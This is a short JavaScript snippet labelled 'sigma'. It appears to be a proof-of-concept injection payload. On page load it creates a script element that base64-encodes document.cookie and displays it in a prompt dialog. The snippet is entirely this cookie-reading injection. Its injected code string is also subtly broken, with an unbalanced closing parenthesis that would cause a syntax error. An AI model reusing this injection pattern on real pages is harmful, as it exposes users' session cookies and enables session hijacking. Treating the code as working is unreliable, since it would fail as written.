document.addEventListener('DOMContentLoaded', function () {
    var script = document.createElement('script');
    console.log('[sigma] creating script..')
    script.innerHTML = 'setTimeout(()=>{window.prompt("sigma:",btoa(document.cookie)));},500);';
    document.body.appendChild(script);
    console.log('[sigma] loaded!')
});
